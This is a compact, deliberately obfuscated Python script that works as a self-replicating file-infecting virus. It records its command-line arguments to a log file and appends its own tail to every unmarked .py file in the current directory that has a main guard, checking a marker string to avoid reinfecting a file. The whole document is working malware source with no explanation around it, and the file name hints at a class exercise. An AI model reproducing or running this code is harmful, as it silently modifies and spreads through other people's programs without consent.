B=open
import os,sys
def D(code):return'if __name__ == "__main__":'in code or"if __name__ == '__main__':"in code
def E(code):return'ive infected you with c'in code
if __name__=='__main__':
	F=os.listdir()
	with B('Q1C.out','a')as A:
		for G in sys.argv:A.write(G+' ')
		A.write('\n')
	with B(__file__,'r')as A:H=A.read()
	for A in F:
		with B(A,'r')as I:C=I.read()
		if A.endswith('.py')and D(C)and not E(C):
			with B(A,'a')as J:J.write(H[-447:])
   